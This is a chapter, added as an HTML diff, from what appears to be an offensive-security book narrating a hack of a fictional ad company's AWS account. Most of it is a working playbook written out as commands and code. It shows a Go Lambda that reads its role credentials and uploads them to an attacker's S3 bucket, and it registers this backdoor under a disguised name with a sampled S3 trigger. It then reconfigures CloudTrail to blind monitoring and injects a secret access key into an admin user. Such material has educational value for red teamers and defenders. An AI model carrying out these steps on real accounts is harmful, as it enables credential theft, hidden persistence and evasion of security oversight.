@@ -1,0 +1,274 @@
+<html><head></head><body>
+<section>
+<header>
+<h1 class="chapter">
+<span class="ChapterNumber"><span epub:type="pagebreak" title="187" id="Page_187"/>11</span><br/>
+<span class="ChapterTitle">Nevertheless, We Persisted</span></h1>
+</header>
+<figure class="opener">
+<img src="image_fi/book_art/chapterart.png" alt=""/>
+</figure>
+<p class="ChapterIntro">While we’re waiting for our shell to phone home, there is one small task that needs our immediate attention: AWS persistence. One might argue that Jenkins’s access keys provide all the persistence we need, since access keys are often difficult to rotate and require reviewing hundreds of jobs for potential hardcoded credentials. It is such a critical piece of any DevOps infrastructure that it ironically succumbs to the same fallacies DevOps is so arrogantly belligerent against—the most recent proof being that the credentials we retrieved from Chef were still very much in use.</p>
+<p>Nevertheless, we have some time to kill while waiting for our shell on a GP machine, so let’s strengthen our grip on MXR Ads.</p>
+<h2 id="h1-501263c11-0001"><span epub:type="pagebreak" title="188" id="Page_188"/>The AWS Sentries</h2>
+<p class="BodyFirst">Backdooring an AWS account can be a delicate procedure involving navigating a treacherous sea of monitoring tools and sensitive alerts. AWS has made considerable efforts to spoon-feed its customers all sorts of indicators of suspicious activity and what it considers to be insecure configurations.</p>
+<p>There are two AWS features in particular that one should be aware of before blindly attacking or backdooring an account: IAM Access Analyzer and CloudTrail Insights.</p>
+<p>IAM Access Analyzer flags every policy document that grants read/write permissions to foreign entities. It most notably covers S3 buckets, KMS keys, Lambda functions, and IAM roles. When introduced, this feature killed one very stealthy persistence strategy: creating an admin role in the victim’s account and granting assume-role privileges to a foreign (our own) AWS account.</p>
+<p>We can quickly check whether there are any Access Analyzer reports produced in the <code>eu-west-1</code> region:</p>
+<pre><code>root@Point1:~/# <b>aws accessanalyzer list-analyzers --region=eu-west-1</b>
+{ "analyzers": [] }</code></pre>
+<p>MXR Ads does not yet take advantage of this feature, but we cannot bet our persistence strategy on the company’s ignorance of a feature that could expose our backdoor with a single click.</p>
+<p>CloudTrail is an AWS service that logs almost every AWS API call in JSON format and optionally stores it on S3 and/or forwards it to another service like CloudWatch to configure metrics and alerts. <a href="#listing11-1" id="listinganchor11-1">Listing 11-1</a> is a sample event of an IAM call that created an access key for the admin user. The event is ripe with information essential to any threat analyst: source IP address, identity of the caller, source of the event, and so forth.</p>
+<pre><code># Sample CloudTrail event creating an additional access key
+{
+    "eventType": "AwsApiCall",
+    "userIdentity": {
+        "accessKeyId": "ASIA44ZRK6WS32PCYCHY",
+        "userName": "admin"
+    },
+    "eventTime": "2019-12-29T18:42:47Z",
+    "eventSource": "iam.amazonaws.com",
+    "eventName": "CreateAccessKey",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "215.142.61.44",
+    "userAgent": "signin.amazonaws.com",
+    "requestParameters": { "userName": "admin" },
+    "responseElements": {
+        "accessKey": {
+            "accessKeyId": "AKIA44ZRK6WSRDLX7TDS",
+<span epub:type="pagebreak" title="189" id="Page_189"/>            "status": "Active",
+            "userName": "admin",
+            "createDate": "Dec 29, 2019 6:42:47 PM"
+}   }   }</code></pre>
+<p class="CodeListingCaption"><a id="listing11-1">Listing 11-1</a>: CloudTrail <code>CreateAccessKey</code> event</p>
+<p>You have got to hand it to AWS for making logging events so intuitive.</p>
+<p>MXR Ads has a global and comprehensive logging strategy covering all regions, as displayed in <a href="#listing11-2" id="listinganchor11-2">Listing 11-2</a>.</p>
+<pre><code>root@Point1:~/# <b>aws cloudtrail describe-trails --region=eu-west-1</b>
+"trailList": [{
+   "IncludeGlobalServiceEvents": true,
+   "Name": "Default",
+   "S3KeyPrefix": "region-all-logs",
+   "IsMultiRegionTrail": true,
+ <span class="CodeAnnotation" aria-label="annotation1">1</span>"HasInsightSelectors": true,
+ <span class="CodeAnnotation" aria-label="annotation2">2</span>"S3BucketName": "mxrads-cloudtrail-all",
+   "CloudWatchLogsLogGroupArn": "arn:aws:logs:eu-west-1:886371554408:
+log-group:CloudTrail/Logs:*",
+...}]</code></pre>
+<p class="CodeListingCaption"><a id="listing11-2">Listing 11-2</a>: Configuration of a trail on CloudTrail that forwards logs to CloudWatch and S3</p>
+<p>Logs are forwarded to the S3 bucket <code>mxrads-cloudtrail-all</code> <span class="CodeAnnotation" aria-label="annotation2">2</span>.</p>
+<p>We see from the flag <code>HasInsightSelectors</code> <span class="CodeAnnotation" aria-label="annotation1">1</span> that MXR Ads is experimenting with a CloudTrail feature called <em>Insights</em>, which detects a spike in API calls and flags it as a suspicious event. As of this moment, it only reports write API calls, like <code>RunInstance</code>, <code>CreateUser</code>, <code>CreateRole</code>, and so on. We can still go nuts with read-only and reconnaissance calls, but as soon as we start automating user account creation, for instance, we must be careful not to hit the dynamic threshold set by CloudTrail Insights.</p>
+<p>These two features (CloudTrail Insights and IAM Access Analyzer) complement other existing services, like GuardDuty, that watch for suspicious events, such as disabling security features (CloudTrail) and communicating with known-bad domains. We can check if GuardDuty is enabled in a given region with the following command:</p>
+<pre><code>root@Point1:~/# <b>aws guardduty list-detectors --region=eu-west-1</b>
+{ "DetectorIds": [ "64b5b4e50b86d0c7068a6537de5b770e" ] }</code></pre>
+<p>Even if MXR Ads neglected to implement all these novelty features, CloudTrail is such a basic component that almost every company has it enabled by default. We could empty the S3 bucket storing the CloudTrail data, but the logs would still be available in CloudTrail itself for at least 90 days.</p>
+<p>Whenever logs are so easily available and useful, caution would advise us to assume the worst: monitoring dashboards tracking API calls, IP addresses, types of services called, unusual queries to highly privileged services, and so on.</p>
+<p><span epub:type="pagebreak" title="190" id="Page_190"/>And the cherry on top: Terraform. We know that MXR Ads relies on Terraform to maintain its infrastructure. If we were to manually change the wrong resource, it would stand out like a sore thumb on the next <code>terraform plan</code> command. An email bearing the subject “You’ve Been Hacked” might have a better chance of going unnoticed.</p>
+<p>These are some of the main pitfalls to keep in mind when interacting with an AWS account. They truly are landmines that can blow up at the slightest misstep. It almost makes you miss the old days of backdooring a Windows Active Directory, when aggregating and parsing event logs from a single machine was a two-day job.</p>
+<p>Now, if you’re in a situation where your target has very poor security and you feel you can get away with manually creating a couple of access keys, adding a few believable IAM users, and giving them admin privileges, please be my guest. In that case there is no need to overengineer the backdoor strategy, especially knowing that Jenkins’s access keys are pretty stable.</p>
+<p>If, however, the company looks overly paranoid—tight access controls, strict and limited privileges, a clean list of active users, and properly configured CloudTrail, CloudWatch, and other monitoring tools—you may need a more robust and stealthier backup strategy.</p>
+<p>For the sake of argument, let’s give MXR Ads the benefit of the doubt and assume the worst. How can we maintain persistent access while flying under the radar?</p>
+<h2 id="h1-501263c11-0002">Persisting in the Utmost Secrecy</h2>
+<p class="BodyFirst">Our backdoor strategy will follow the hippest design architectures and be fully serverless and event-driven. We’ll configure a watchdog to fire upon specific events and trigger a job that will re-establish our access when those events are detected.</p>
+<p>Translated into AWS jargon, the watchdog would consist of a Lambda function triggered by an event of our choosing. We can opt for a CloudWatch event that fires every day at 10 <span class="KeyCaps">AM</span>, for instance, or a load balancer that receives a predefined request. We choose to go with an event fired when an S3 bucket receives new objects. Both MXR Ads and GP use this same trigger, so we have a higher chance of blending in. Once executed, the Lambda will dump its attached role credentials and send them to our own S3 bucket. The credentials we receive will be valid for one hour but will hold enough privileges to permanently restore durable access.</p>
+<aside epub:type="sidebar">
+<div class="top hr"><hr/></div>
+<section class="note">
+<h2><span class="NoteHead">NOTE</span></h2>
+<p>	A sexier approach would be to tie our Lambda to a CloudWatch event that gets triggered whenever the Jenkins access key gets rotated. Unfortunately, one can only set one target Lambda per log group, and it’s immediately visible in the CloudWatch dashboard. The advantage of hooking into S3 is that the information is buried inside of S3’s dashboard.</p>
+<div class="bottom hr"><hr/></div>
+</section>
+</aside>
+<p>Let’s review our detection checklist: the Lambda function will be triggered by some frequently occurring internal event (in this case, when an <span epub:type="pagebreak" title="191" id="Page_191"/>object is uploaded to MXR Ads’ S3 bucket) and will, in response, perform a rather boring put-object call to deposit a file containing its credentials in a remote bucket. IAM Access Analyzer will hardly blink.</p>
+<p>Terraform will not scream blue murder at the setup phase, as most of the resources will be created, not altered. Even if the source bucket is already declared in the state, technically we will be adding an <code>aws_s3_bucket_notification</code> resource, which is a completely separate entity in Terraform. All we have to do is choose a bucket with no Terraformed notification setup, and we are good to go.</p>
+<p>As for CloudTrail, the only event it will log is the trusted service <em>lambda.amazonaws.com</em> impersonating a role to execute the Lambda. This is a trivial event inherent to any Lambda execution that will go unnoticed by both Insights and GuardDuty.</p>
+<p>Everything looks green!</p>
+<h3 id="h2-501263c11-0001">The Program to Execute</h3>
+<p class="BodyFirst">Let’s get to the implementation phase. The program that the Lambda will run is a straightforward Go binary that follows the key steps just described. The full implementation is available in this book’s repo (<a href="http://bit.ly/2Oan7I7" class="LinkURL">http://bit.ly/2Oan7I7</a>), so here is a brief overview of the main logic.</p>
+<p>Every Go program destined to run in a Lambda environment starts off with the same boilerplate <code>main</code> function that registers the Lambda’s entry point (<code>HandleRequest</code> in this case):</p>
+<pre><code>func main() {
+    lambda.Start(HandleRequest)
+}</code></pre>
+<p>Next, we have a classic setup to build an HTTP client and create the remote S3 URL to submit our response:</p>
+<pre><code>const S3BUCKET="mxrads-analytics"
+func HandleRequest(ctx context.Context, name MyEvent) (string, error) {
+    client := &amp;http.Client{}
+    respURL := fmt.Sprintf("https://%s.s3.amazonaws.com/setup.txt", S3BUCKET)</code></pre>
+<p>We dump the Lambda’s role credentials from environment variables and send them to our remote bucket:</p>
+<pre><code>    accessKey := fmt.Sprintf(`
+        AWS_ACCESS_KEY_ID=%s
+        AWS_SECRET_ACCESS_KEY=%s
+        AWS_SESSION_TOKEN=%s"`,
+            os.Getenv("AWS_ACCESS_KEY_ID"),
+            os.Getenv("AWS_SECRET_ACCESS_KEY"),
+            os.Getenv("AWS_SESSION_TOKEN"),
+        )
+    uploadToS3(s3Client, S3BUCKET, "lambda", accessKey)</code></pre>
+<p><span epub:type="pagebreak" title="192" id="Page_192"/>The <code>uploadToS3</code> method is a simple PUT request to the previously defined URL, so its implementation should be pretty obvious from reading the source code, which all in all is about 44 lines long.</p>
+<p>We compile the code and then zip the binary:</p>
+<pre><code>root@Point1:lambda/# <b>make</b>
+root@Point1:lambda/# <b>zip function.zip function</b></code></pre>
+<p>Now we turn our attention to setting up the Lambda.</p>
+<h3 id="h2-501263c11-0002">Building the Lambda</h3>
+<p class="BodyFirst">The Lambda needs an execution role with heavy IAM and CloudTrail permissions to help us maintain stealthy long-term access (more on that later).</p>
+<p>We look for promising candidates we can impersonate with the Lambda AWS service. Remember that in order to impersonate a role, two conditions must be met: the user must be able to issue <code>sts assume-role</code> calls and the role must accept impersonation from said user. We list the roles available within MXR Ads’ AWS account:</p>
+<pre><code>root@Point1:~/# <b>aws iam list-roles \</b>
+<b>| jq -r '.Roles[] | .RoleName + ", " + \</b>
+<b>.AssumeRolePolicyDocument.Statement[].Principal.Service' \</b>
+<b>| grep "lambda.amazonaws.com"</b>
+
+dynamo-access-mgmt, lambda.amazonaws.com
+chef-cleanup-ro, lambda.amazonaws.com
+<var>--snip--</var></code></pre>
+<p>We check each role’s IAM policy until we find a role with the set of permissions we need—ideally, full IAM and CloudTrail access:</p>
+<pre><code>root@Point1:~/# <b>aws iam list-attached-role-policies --role dynamo-ssh-mgmt --profile jenkins</b>
+
+"AttachedPolicies": [
+     "PolicyName": IAMFullAccess",
+     "PolicyName": cloudtrail-mgmt-rw",
+     "PolicyName": dynamo-temp-rw",
+<var>--snip--</var></code></pre>
+<p>The <code>dynamo-ssh-mgmt</code> role might do the trick, as it has an <code>IAMFullAccess</code> policy. Cheeky. If we had been creating our own role from scratch in MXR Ads’ AWS account, we would not have dared to attach such an obvious policy. However, since they’re already using it, we might as well take advantage of it. Plus, this role lacks CloudWatch write permissions, so the Lambda will silently discard its execution logs upon termination rather than passing them to CloudWatch. Perfect.</p>
+<p><span epub:type="pagebreak" title="193" id="Page_193"/>As always, we try hiding in plain sight by sticking to existing naming conventions. We look up existing Lambda functions in the <code>eu-west-1</code> region for inspiration:</p>
+<pre><code>root@Point1:~/# <b>aws iam lambda list-functions –region=eu-west-1</b>
+"FunctionName": "support-bbs-news",
+"FunctionName": "support-parse-logs",
+"FunctionName": "ssp-streaming-format",
+<var>--snip--</var></code></pre>
+<p>We’ll settle on the name <code>support-metrics-calc</code> and call the <code>create-function</code> API to register our backdoored Lambda:</p>
+<pre><code>root@Point1:~/# <b>aws lambda create-function --function-name support-metrics-calc \</b>
+<b>--zip-file fileb://function.zip \</b>
+<b>--handler function \</b>
+<b>--runtime go1.x \</b>
+<b>--role arn:aws:iam::886371554408:role/dynamo-ssh-mgmt \</b>
+<b>--region eu-west-1</b></code></pre>
+<p>Now to the trigger event itself.</p>
+<h3 id="h2-501263c11-0003">Setting Up the Trigger Event</h3>
+<p class="BodyFirst">Ideally, we want to target an S3 bucket that’s regularly updated by MXR Ads, but not so often that it would trigger our Lambda 1,000 times a day.</p>
+<aside epub:type="sidebar">
+<div class="top hr"><hr/></div>
+<section class="note">
+<h2><span class="NoteHead">NOTE</span></h2>
+<p>	We chose to create the Lambda in the same region used by MXR Ads, but we could have just as well smuggled it into an unused region. This Lambda will cost practically nothing, so it will hardly be noticeable, even on the billing report.</p>
+<div class="bottom hr"><hr/></div>
+</section>
+</aside>
+<p>How about s4d.mxrads.com, the bucket storing all creatives that we looked at in Chapter 8? A quick <code>list-objects-v2</code> API call shows that the update pace is relatively low, between 50 and 100 files a day:</p>
+<pre><code>root@Point1:~/# <b>aws s3api list-objects-v2 --bucket s4d.mxrads.com &gt; list_keys.txt</b>
+ "Key": "2aed773247f0211803d5e67b/82436/vid/720/6aa58ec9f77aca497f90c71c85ee.mp4",
+ "LastModified": "2019-12-14T11:01:48.000Z",
+<var>--snip--</var>
+
+root@Point1:~/# <b>grep -c "2020-12-14" list_keys.txt</b>
+89
+root@Point1:~/# <b>grep -c "2020-12-13"</b> <b>list_keys.txt</b>
+74
+<var>--snip--</var></code></pre>
+<p>We can reduce the trigger rate by sampling the objects firing the notification event. We’ll make it so only objects with a key name beginning with <code>"2"</code> will trigger our Lambda, giving us a 1/16 sample rate (assuming a hexadecimal key space, evenly distributed). This roughly translates to three to six invocations a day.</p>
+<p>Sold.</p>
+<p><span epub:type="pagebreak" title="194" id="Page_194"/>We explicitly allow the S3 service to call our Lambda function. The <code>statement-id</code> parameter is an arbitrary, unique name:</p>
+<pre><code>root@Point1:~/# <b>aws lambda add-permission \</b>
+<b>--function-name support-metrics-calc \</b>
+<b>--region eu-west-1 \</b>
+<b>--statement-id s3InvokeLambda12 \</b>
+<b>--action "lambda:InvokeFunction" \</b>
+<b>--principal s3.amazonaws.com \</b>
+<b>--source-arn arn:aws:s3:::s4d.mxrads.com \</b>
+<b>--source-account 886371554408 \</b>
+<b>--profile jenkins</b></code></pre>
+<p>Then, we set up the bucket rule that only triggers events upon creating objects starting with the <code>"2"</code> prefix:</p>
+<pre><code>root@Point1:~/# <b>aws s3api put-bucket-notification-configuration \</b>
+<b>--region eu-west-1 \</b>
+<b>--bucket mxrads-mywebhook \</b>
+<b>--profile jenkins \</b>
+<b>--notification-configuration file://&lt;(cat &lt;&lt; EOF</b>
+<b>{</b>
+<b>    "LambdaFunctionConfigurations": [{</b>
+<b>        "Id": "s3InvokeLambda12",</b>
+<b>        "LambdaFunctionArn": "arn:aws:lambda:eu-west-1:886371554408</b>
+<b>:function:support-metrics-calc",</b>
+<b>        "Events": ["s3:ObjectCreated:*"],</b>
+<b>        "Filter": {</b>
+<b>            "Key": {</b>
+<b>                "FilterRules": [{</b>
+<b>                    "Name": "prefix",</b>
+<b>                    "Value": "2"</b>
+<b>                }]</b>
+<b>            }</b>
+<b>        }</b>
+<b>    }]</b>
+<b>}</b>
+<b>EOF</b>
+<b>)</b></code></pre>
+<p>Brilliant. We have a solid persistence strategy that bypasses old and new detection features alike.</p>
+<p>Now assume our Jenkins access gets revoked somehow and we would like to use our Lambda credentials to re-establish permanent access. Should we just spawn a new IAM user with unlimited privileges and carry on with our lives? Not the wisest approach. Any monitoring solution based on CloudTrail could pick up this odd request in a matter of minutes.</p>
+<p>The current CloudTrail configuration, as we saw earlier, aggregates logs from all regions into the one <code>eu-west-1</code> region. The logs are then pushed into S3 and CloudWatch where they can be consumed by monitoring devices. This event-forwarding feature is called a <em>trail</em>.</p>
+<p>Before calling any IAM operation, we need to disrupt this trail.</p>
+<h3 id="h2-501263c11-0004"><span epub:type="pagebreak" title="195" id="Page_195"/>Covering Our Tracks</h3>
+<p class="BodyFirst">Notice how our intention is not to disable logging but to disrupt the trail itself. Indeed, it is currently impossible to completely disable CloudTrail or make it skip events. No matter what we do, our API calls will still be visible in the CloudTrail event dashboard for the next 90 days.</p>
+<p>The trail, however, can be reconfigured to omit forwarding certain events. It can even black out entire regions while we carry out our nefarious tasks.</p>
+<p>No trail means no logs on S3, no GuardDuty, no CloudTrail Insights, no CloudWatch metrics, and no custom security dashboards. Just like dominos, all monitoring tools inside and outside AWS will fall one after the other in a deafening silence. We could add 100 IAM users or start 1,000 instances in São Paulo and nobody would notice a thing, except perhaps for the accounting department.</p>
+<aside epub:type="sidebar">
+<div class="top hr"><hr/></div>
+<section class="note">
+<h2><span class="NoteHead">NOTE</span></h2>
+<p>	GuardDuty will still monitor and report unusual network traffic when VPC logs are enabled, but there’s nothing to stop us from playing with AWS APIs.</p>
+<div class="bottom hr"><hr/></div>
+</section>
+</aside>
+<p>Here’s a quick example showing how we can reconfigure the trail to exclude global (IAM, STS, and so on) and multiregion events:</p>
+<pre><code>root@Point1:~/# <b>curl https://mxrads-report-metrics.s3-eu-west-1.amazonaws.com/lambda</b>
+
+AWS_ACCESS_KEY_ID=ASIA44ZRK6WSTGTH5GLH
+AWS_SECRET_ACCESS_KEY=1vMoXxF9Tjf2OMnEMU...
+AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEPT...
+
+# We load these ENV variables, then disable CloudTrail global and multiregion logging
+root@Point1:~/# <b>aws cloudtrail update-trail \</b>
+<b>--name default \</b>
+<b>--no-include-global-service-events \</b>
+<b>--no-is-multi-region \</b>
+<b>--region=eu-west</b>
+
+"Name": "default",
+"S3BucketName": "mxrads-cloudtrail-logs",
+"IncludeGlobalServiceEvents": false,
+"IsMultiRegionTrail": false,
+<var>--snip--</var></code></pre>
+<p>Starting from this instant, we have <em>carte blanche</em> to create users and access keys, and do all sorts of tomfoolery. Someone manually going through the CloudTrail dashboard might pick up on our API calls if we are extremely careless, but all automated solutions and tools will be in the dark.</p>
+<h3 id="h2-501263c11-0005">Recovering Access</h3>
+<p class="BodyFirst">Now that we have disabled CloudTrail, we can move on to creating a more permanent set of AWS credentials.</p>
+<p><span epub:type="pagebreak" title="196" id="Page_196"/>Users and groups affiliated with the default admin policy are easy prey. IAM users are limited to two access keys, so we find a user with one or zero access keys and proceed to inject them with an additional key that we will secretly own. First, we list the users and groups:</p>
+<pre><code>root@Point1:~/# <b>aws iam list-entities-for-policy \</b>
+<b>--policy-arn arn:aws:iam::aws:policy/AdministratorAccess</b>
+
+UserName: b.daniella
+UserName: chris.hitch
+UserName: d.ressler
+<var>--snip--</var></code></pre>
+<p>Then we list their currently defined access keys:</p>
+<pre><code># List access keys. If they have less than 2, there's room for another.
+root@Point1:~/# <b>aws iam list-access-keys \</b>
+<b>--user b.daniella \</b>
+<b>| jq ".AccessKeyMetadata[].AccessKeyId"</b>
+
+"AKIA44ZRK6WS2XS5QQ4X"</code></pre>
+<p>Great, <em>b.daniella</em> only has one key. With our target identified, we create an access key:</p>
+<pre><code>root@Point1:~/# <b>aws iam create-access-key --user b.daniella</b>
+UserName: b.daniella,
+AccessKeyId: AKIA44ZRK6WSY37NET32,
+SecretAccessKey: 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,</code></pre>
+<p>And we are back in business. We’ve regained permanent credentials.</p>
+<p>We cannot re-enable multiregion logging just yet, though. We need to wait at least half an hour after our last API call. This waiting period is critical, because it can take up to 20 minutes for the event to get to CloudTrail. If we reactivate global event logging too early, some of our actions might slip into the trail, and therefore into S3, Insights, CloudWatch, and other platforms.</p>
+<h2 id="h1-501263c11-0003">Alternative (Worse) Methods</h2>
+<p class="BodyFirst">You may be wondering why we don’t simply use the Lambda itself to automate subsequent IAM/CloudTrail actions. A Lambda function can only last a maximum of 15 minutes, so there is a reasonable chance it would re-enable global event logs too soon. We could hook another Lambda on our side to avoid this race condition, but that’s too much pipeline work for something so trivial.</p>
+<p><span epub:type="pagebreak" title="197" id="Page_197"/>Alternatively, we could opt for running a reverse shell directly in the Lambda environment, but that’s far from convenient. The function runs in a minimal container where the filesystem is mounted as read-only, except for the <em>/tmp</em> folder, which lacks the executable flag. We would need to manually load the reverse shell in memory as an independent process, so it does not get terminated by the Lambda handler. All for what? A barren land lacking the most basic utilities that will be recycled by AWS in 60 minutes? Not worth the effort.</p>
+<h2 id="h1-501263c11-0004">Resources</h2>
+<ul>
+<li>More information on IAM Access Analyzer: <a href="https://aws.amazon.com/iam/features/analyze-access/">https://aws.amazon.com/iam/features/analyze-access/</a>.</li>
+<li>More information on CloudTrail Insights: <a href="https://amzn.to/38ROX6E" class="LinkURL">https://amzn.to/38ROX6E</a>.</li>
+<li>A list of AWS S3 notification events: <a href="https://amzn.to/2MTqg1o" class="LinkURL">https://amzn.to/2MTqg1o</a>.</li>
+<li>More information about centralizing logs: <a href="https://www.loggly.com/ultimate-guide/centralizing-windows-logs/" class="LinkURL">https://www.loggly.com/ultimate-guide/centralizing-windows-logs/</a>.</li>
+<li>More information about querying Windows logs: <a href="https://evotec.xyz/powershell-everything-you-wanted-to-know-about-event-logs/" class="LinkURL">https://evotec.xyz/powershell-everything-you-wanted-to-know-about-event-logs/</a>.</li>
+</ul>
+</section>
+</body></html>
